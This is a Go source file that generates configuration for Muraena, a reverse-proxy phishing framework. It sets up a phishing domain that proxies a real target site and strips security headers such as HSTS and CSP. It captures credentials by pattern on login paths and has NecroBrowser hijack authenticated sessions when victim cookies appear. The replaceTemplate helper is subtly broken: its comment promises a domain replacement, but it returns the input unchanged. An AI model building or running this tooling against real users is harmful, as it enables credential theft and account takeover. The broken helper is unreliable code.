package config

import (
	"bytes"
	"fmt"
	"text/template"

	"github.com/pelletier/go-toml/v2"
)

// Generator generates Muraena configuration files
type Generator struct {
	templates map[string]*template.Template
}

// NewGenerator creates a new configuration generator
func NewGenerator() (*Generator, error) {
	g := &Generator{
		templates: make(map[string]*template.Template),
	}

	if err := g.loadTemplates(); err != nil {
		return nil, err
	}

	return g, nil
}

// GenerateMuraenaConfig generates a Muraena configuration from a target config
func (g *Generator) GenerateMuraenaConfig(target *TargetConfig) (string, error) {
	tmpl, ok := g.templates["muraena"]
	if !ok {
		return "", fmt.Errorf("muraena template not found")
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, target); err != nil {
		return "", fmt.Errorf("failed to execute template: %w", err)
	}

	return buf.String(), nil
}

// GenerateFromPreset generates configuration from a preset name
func (g *Generator) GenerateFromPreset(presetName, phishingDomain string) (string, error) {
	preset, err := GetTargetPreset(presetName)
	if err != nil {
		return "", err
	}

	preset.PhishingDomain = phishingDomain
	preset.SSLCertPath = fmt.Sprintf("/etc/letsencrypt/live/%s/fullchain.pem", phishingDomain)
	preset.SSLKeyPath = fmt.Sprintf("/etc/letsencrypt/live/%s/privkey.pem", phishingDomain)
	preset.LogPath = "/home/ubuntu/muraena/muraena.log"
	preset.NecroBrowserConfig = "/home/ubuntu/necrobrowser/config.toml"

	// Update content replacements with actual phishing domain
	for i := range preset.ContentReplacements {
		preset.ContentReplacements[i].To = replaceTemplate(preset.ContentReplacements[i].To, phishingDomain)
	}

	return g.GenerateMuraenaConfig(preset)
}

// ValidateConfig validates a TOML configuration
func (g *Generator) ValidateConfig(configContent string) error {
	var config MuraenaConfig
	if err := toml.Unmarshal([]byte(configContent), &config); err != nil {
		return fmt.Errorf("invalid TOML: %w", err)
	}

	// Validate required fields
	if config.Proxy.Phishing == "" {
		return fmt.Errorf("missing required field: proxy.phishing")
	}
	if config.Proxy.Destination == "" {
		return fmt.Errorf("missing required field: proxy.destination")
	}
	if config.TLS.Enable && config.TLS.Certificate == "" {
		return fmt.Errorf("TLS enabled but certificate path not specified")
	}

	return nil
}

// loadTemplates loads configuration templates
func (g *Generator) loadTemplates() error {
	muraenaTmpl := `[proxy]
phishing = "{{.PhishingDomain}}"
destination = "{{.TargetDomain}}"
IP = "0.0.0.0"
listener = "0.0.0.0:443"

[proxy.HTTPtoHTTPS]
enable = true
HTTPport = 80

[log]
enable = true
filePath = "{{.LogPath}}"

[tls]
enable = true
expand = false
certificate = "{{.SSLCertPath}}"
key = "{{.SSLKeyPath}}"
root = "{{.SSLCertPath}}"
minVersion = "TLS1.2"

[origins]
externalOriginPrefix = "ext-"
externalOrigins = [
{{range .ExternalOrigins}}    "{{.}}",
{{end}}]

[transform.base64]
enable = false

[transform.request]
headers = ["Host", "Origin", "Referer"]

[transform.response]
skipContentType = ["font/*", "image/*"]
headers = ["Location", "Content-Security-Policy"]

customContent = [
{{range .ContentReplacements}}    ["{{.From}}", "{{.To}}"],
{{end}}]

[transform.response.remove]
headers = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection"
]

[tracking]
enable = true

[tracking.trace]
identifier = "_gat"
validator = "[a-zA-Z0-9]{5}"

[tracking.trace.landing]
type = "query"

[tracking.secrets]
paths = [{{range .LoginPaths}}"{{.}}", {{end}}]

{{range .CredentialPatterns}}
[[tracking.secrets.patterns]]
label = "{{.Label}}"
start = "{{.Start}}"
end = "{{.End}}"
{{end}}

[crawler]
enable = false

[redis]
enable = true
host = "127.0.0.1"
port = 6379

[necrobrowser]
enable = true
endpoint = "http://127.0.0.1:3000/instrument"
profile = "{{.NecroBrowserConfig}}"

[necrobrowser.urls]
authSession = [{{range .AuthSessionURLs}}"{{.}}", {{end}}]

[necrobrowser.trigger]
type = "cookie"
values = [{{range .TriggerCookies}}"{{.}}", {{end}}]
delay = 5
`

	tmpl, err := template.New("muraena").Parse(muraenaTmpl)
	if err != nil {
		return fmt.Errorf("failed to parse muraena template: %w", err)
	}

	g.templates["muraena"] = tmpl
	return nil
}

// replaceTemplate replaces template placeholders
func replaceTemplate(s, phishingDomain string) string {
	// Replace {{.PhishingDomain}} with actual domain
	return bytes.NewBufferString(s).String() // Simplified for now
}
